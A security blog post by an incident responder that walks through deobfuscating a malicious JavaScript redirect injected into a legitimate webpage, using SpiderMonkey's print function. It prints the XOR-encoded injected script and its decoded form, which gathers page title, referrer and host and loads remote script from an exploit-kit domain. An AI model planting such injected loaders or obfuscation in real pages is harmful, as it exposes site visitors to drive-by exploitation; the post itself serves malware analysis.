---
title: "JavaScript: Deobfuscate With Just A Print Function"
categories: blog
tags: [javascript]
date: 2015-10-18T15:25:30-04:00
---

As an incident responder who deals with a lot of exploit kit related events, packet captures are invaluable. If you're in the same boat, I hope you have pcaps for what triggered the alert, as well as some time on your hands to follow the trail back to the original source and start breaking down what occurred. It's not uncommon for there to be multiple redirects to the exploit kit landing page, and once the source of the activity is located, you'll probably be greeted with some nice obfuscated code.

It's no surpise that there are multiple ways to redirect users who visit a site, but a common way would be through JavaScript. Below is a sample of the latest malicious JavaScript I've come across that was injected into a legitimate webpage.


### The Obfuscated Code
---

The following is what was noticed within the body of a webpage that was visited, right before the closing "</head>" tag. Typically, malicious code is not formatted in a neat manner, and this case wasn't any different. To format the output in a more readable format, a great online resource is [jsbeautifier](http://jsbeautifier.org/).

```javascript
var a="'02'02'02'02'1Aqapkrv'1G'2C'02'02'02'02'02'02'02'02dwlavkml'02qvpkleEgl'0:ngl'0;'5@'2C'02'02'02'02'02'02'02'02'02'02'02'02tcp'02vgzv'02'1F'02'00'00'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02tcp'02ajcpqgv'02'1F'02'00c`afgdejkhinolmrspqvwtuz{x23016745:;'00'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02dmp'0:'02tcp'02k'1F2'1@'02k'02'1A'02ngl'1@'02k))'02'0;'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02vgzv'02)'1F'02ajcpqgv,ajcpCv'0:Ocvj,dnmmp'0:Ocvj,pclfmo'0:'0;'02('02ajcpqgv,nglevj'0;'0;'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02pgvwpl'02vgzv'1@'2C'02'02'02'02'02'02'02'02'5F'2C'02'02'02'02'02'02'02'02qgvVkogmwv'0:32'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02qg]pgdgppgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:uklfmu,nmacvkml,jmqv'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02`cqg'02'1F'02'00k,knnwoklcvkmlgq,amo-hqlkvaj'00'1@'2C'02'02'02'02'02'02'02'02tcp'02wwkf'02'1F'02qvpkleEgl'0:7'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02l]wpn'02'1F'02'00jvvr'1C--'00'02)'02wwkf'02)'02'00,'00'02)'02`cqg'02)'02'00'1Dfgdcwnv]ig{umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'00'04qg]pgdgppgp'1F'00'02)'02qg]pgdgppgp'02)'02'00'04qmwpag'1F'00'02)'02jmqv'1@'2C'02'02'02'02'02'02'02'02kd'02'0:fgdcwnv]ig{umpf'02'03'1F'1F'02lwnn'02'04'04'02fgdcwnv]ig{umpf'02'03'1F'1F'02'05'05'02'04'04'02qg]pgdgppgp'02'03'1F'1F'02lwnn'02'04'04'02qg]pgdgppgp'02'03'1F'1F'02'05'05'0;'5@'2C'02'02'02'02'02'02'02'02'02'02'02'02fmawoglv,upkvg'0:'05'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'02qpa'1F'00'05'02)'02l]wpn'02)'02'05'00'1G'05'02)'02'05'1A'05'02)'02'05-qapkrv'1G'05'0;'1@'2C'02'02'02'02'02'02'02'02'5F'2C'02'02'02'02'1A-qapkrv'1G";

b="";
c="";
var clen;
clen=a.length;
for(i=0;i<clen;i++)
	{
	b+=String.fromCharCode(a.charCodeAt(i)^2)
	}
c=unescape(b);
document.write(c);
```

### Analysis Part 1
---

So, clearly, this was pretty easy to pick out from the returned webpage when viewing the http stream.

Lets review some of the methods that the malicious actor is using to hide the original code.

1. ```charCodeAt()```:
   - This method will return the unicode character of a letter based on the string that is  provided and the number that is passed to the argument.
	
2. ```Bitwise XOR```:
   - The "^" operator in JavaScript is for bitwise XORing. In an example of "a XOR b", if a == b, then the result is 0, else the result is 1.

3. ```fromCharCode()```:
   - This method will convert a unicode number into its ascii character equivalent.

4. ```unescape()```:
   - This method is used for the encoding and decoding of strings.
	

### The Greatness of Printing
---

So we have the malicious JavaScript and did some research to get an understanding of how the original code is being hidden. If we don't have the time to put together a script to reverse the encoded text, perhaps we can get away with a quicker work around.

The great thing about this particular example is that we can see all of the code necessary to reverse the output was provided. In some cases, it's not this simple and code might be loaded in from things like other scripts or html elements within the page.

Lets take a look at the last line of code,```"document.write(c)"```. This method will write out the contents of the variable "c" back to the webpage, which is the decoded content. Instead of writing this back to the webpage, lets see what we can do to reveal this content.

A great tool to help with this task is [SpiderMonkey](https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey) from Mozilla. Follow the [build instructions](https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey/Build_Documentation) for your operating system before continuing.

Now that SpiderMonkey is installed, we can execute JavaScript from a terminal window for ease of use.

1. Copy the JavaScript from above and place it into a temporary file with a ".js" extension. For this example, I've called it mal.js

2. Before saving the file, edit the last line of code and switch it from "```document.write(c);```" to "```print(c);```". Save the file.

3. From the terminal, type "js mal.js".

You should now see the decoded text. I've added brackets around the domain since it is malicious, so please be careful.

```javascript
function stringGen(len){
	var text = "";
    var charset = "abcdefghijklmnopqrstuvwxyz0123456789";
    for( var i=0; i < len; i++ )
    	text += charset.charAt(Math.floor(Math.random() * charset.length));
        return text;
        }

setTimeout(10);
var default_keyword = encodeURIComponent(document.title);
var se_referrer = encodeURIComponent(document.referrer);
var host = encodeURIComponent(window.location.host);
var base = "i[.]illuminationes[.]com/jsnitch";
var uuid = stringGen(5);
var n_url = "http://" + uuid + "." + base + "?default_keyword=" + default_keyword +
                "&se_referrer=" + se_referrer + "&source=" + host;
if (default_keyword !== null && default_keyword !== '' && se_referrer !== null && se_referrer !== ''){
    	document.write('<script type="text/JavaScript" src="' + n_url + '">' + '<' + '/script>');
        }
```

### Analysis Part 2
---

Now that we can see the code, the process starts over again with analyzing the sample to get an understanding of what is occurring.

1. ```stringGen(len)```:
	- Randomly generates a 5 character string. The result is assigned to the "uuid" variable.
	
2. The following are standard JavaScript methods that access DOM elements.
  - ```document.title``` - current page title.
  - ```document.referer``` - the referrer webpage that lead to the current document.
  - ```window.location.host``` - the current domain
	
3. ```var base```:
  - The base url which will be used in structuring the full url request.
	
4. ```var n_url```:
  - This variable holds the formatting of the url where additional JavaScript will be retreived. Example: "http://abcde.baseurl./directory?default_keyword=currentwebpagetitle&se_referrer=documentreferrer&source=currentdomain"
	
5. The last couple lines is an "if" condition which evaluated whether or not the two variables exist (default_keyword and se_referrer).
  - If they exist, then an addidional \<script> tag is added with the source being the completed url assigned to variable "n_url".
  - If they do not, then the additonal JavaScript is not downloaded.
	
So if you you went to the website directly (eg: without clicking a link from a google search), then the additonal JavaScript does not get executed.
	
### Summary
---

Alas, we've come this far only to hit a roadblock. Due to the random generation of 5 characters for the sub domain, DNS requests fail because the domains have not been stood up. It's my guess that the adversary hasn't been able to register all variations, which will likely lead to a lower success rate for exploitation. If you look up the main domain within [VirusTotal](https://www.virustotal.com/en/domain/i.illuminationes.com/information/), you will see that there are detections for a good amount of subdomains that match the naming convention we've uncovered. I've even tried reaching a couple of these without success. Even though we couldn't get this to dance the way we wanted, it was a good exercise in reviewing JavaScript and obfuscation techniques.